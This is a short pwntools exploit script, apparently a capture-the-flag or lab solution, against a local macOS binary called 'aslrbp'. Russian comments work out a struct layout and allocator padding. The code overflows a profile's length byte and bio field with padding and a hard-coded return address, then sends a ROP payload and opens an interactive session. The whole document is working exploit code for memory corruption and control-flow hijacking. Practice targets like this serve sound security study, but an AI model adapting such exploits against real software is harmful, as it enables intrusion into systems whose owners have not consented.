from pwn import *

#context.log_level = "DEBUG"
p = process(["./aslrbp", "./4"])

"""
00000000 struct __fixed profile // sizeof=0x31
00000000 {
00000000     char name[16];
00000010     unsigned __int8 len;
00000011     char bio[32];         //  <------ начало на  0х11
00000031 };


аллокатор мак ос х даст нам не 0x31, а 0x40 (по 16 выравнивание)
>>> 0x40 - 0x11
47
"""

payload = b"A"*47 + b"A"*40 + p64(0x100000598) + b"\x00"
payload2 = b"A"*72 + p64(0x10000056C)


p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Name: ", b"A"*16 + b"\xFF")
p.sendlineafter(b"> ", b"4")
p.sendlineafter(b"> ", b"5")
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"Bio (max 255 bytes): ", payload)
p.sendlineafter(b"> ", b"6")
p.sendlineafter(b"ROP payload:", payload2)

p.interactive()
